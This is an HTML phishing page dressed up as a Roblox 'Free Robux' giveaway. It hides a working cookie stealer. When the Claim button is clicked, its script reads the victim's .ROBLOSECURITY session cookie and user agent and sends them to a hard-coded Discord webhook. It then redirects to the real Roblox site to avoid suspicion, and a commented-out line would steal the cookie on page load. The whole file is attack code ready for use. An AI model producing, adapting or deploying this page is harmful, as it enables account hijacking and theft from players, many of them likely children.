<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox - Claim Your Free Robux!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #1b1b1b;
            color: #fff;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            background-color: #00b7ff;
            border: none;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #0099cc;
        }
    </style>
    <script>
        // Function to extract and send the Roblox cookie
        function logRobloxCookie() {
            try {
                // Grab all cookies
                const cookies = document.cookie;
                const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";

                // Extract cookie value if it exists
                const cookieValue = robloxCookie.includes('=') ? robloxCookie.split('=')[1] : robloxCookie;

                // Discord webhook URL (replace with your test webhook)
                const webhookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";

                // Build the Discord payload
                const payload = {
                    username: "Roblox Logger",
                    avatar_url: "https://i.imgur.com/xyz123.png", // Optional avatar
                    content: "Caught a Roblox cookie!",
                    embeds: [{
                        title: "Stolen Cookie Info",
                        fields: [
                            { name: "Cookie", value: `\`\`\`${cookieValue}\`\`\``, inline: true },
                            { name: "Timestamp", value: new Date().toLocaleString(), inline: true },
                            { name: "User Agent", value: navigator.userAgent, inline: false }
                        ],
                        color: 15258703 // Bright yellow for visibility
                    }]
                };

                // Send to Discord webhook
                fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log("Cookie sent successfully!");
                        // Redirect to real Roblox site after a short delay
                        setTimeout(() => {
                            window.location.href = "https://www.roblox.com/";
                        }, 1000);
                    } else {
                        throw new Error("Webhook failed");
                    }
                })
                .catch(error => {
                    console.error("Error sending to webhook:", error);
                    // Redirect anyway to avoid suspicion
                    window.location.href = "https://www.roblox.com/";
                });
            } catch (error) {
                console.error("Something broke:", error);
                window.location.href = "https://www.roblox.com/"; // Fallback redirect
            }
        }

        // Trigger on page load or button click
        window.onload = function() {
            // Uncomment to steal cookie immediately on load
            // logRobloxCookie();

            // Or wait for user interaction (more subtle)
            document.getElementById("claimButton").addEventListener("click", logRobloxCookie);
        };
    </script>
</head>
<body>
    <h1>Roblox Free Robux Giveaway!</h1>
    <p>Click below to claim 1000 Robux instantly!</p>
    <button id="claimButton">Claim Now</button>
</body>
</html>
